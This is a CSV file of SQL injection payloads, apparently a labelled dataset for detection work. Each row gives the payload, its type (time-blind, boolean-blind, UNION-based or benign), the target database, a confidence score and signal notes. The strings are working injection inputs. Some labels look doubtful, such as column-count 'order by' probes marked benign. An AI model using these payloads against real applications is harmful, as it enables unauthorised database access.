id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
2043,"1"" ) ) as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
2039,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
2076,-4761 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
2125,-1564' ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
2133,"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
2141,-3125' ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 24 chars.,2
2151,-1192 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 17 chars.,2
2164,"1, ( case when 8260 = 8260 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 49 chars.,2
2000,"-8432 ) union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
2001,"-4889"" ) ) as vvuo where 8060 = 8060 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,2
2003,-3211 ) ) as fsej where 6348 = 6348 or 9805 = 3783--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
2005,"-1048%"" or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
2007,"1"" ) ) as qhnb where 8302 = 8302 and ( 3020 = 3020 ) *6703--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
2011,"1 ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
2012,-4384' ) ) ) or 6872 = 6872 and ( ( ( 'ukhl' = 'ukhl,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
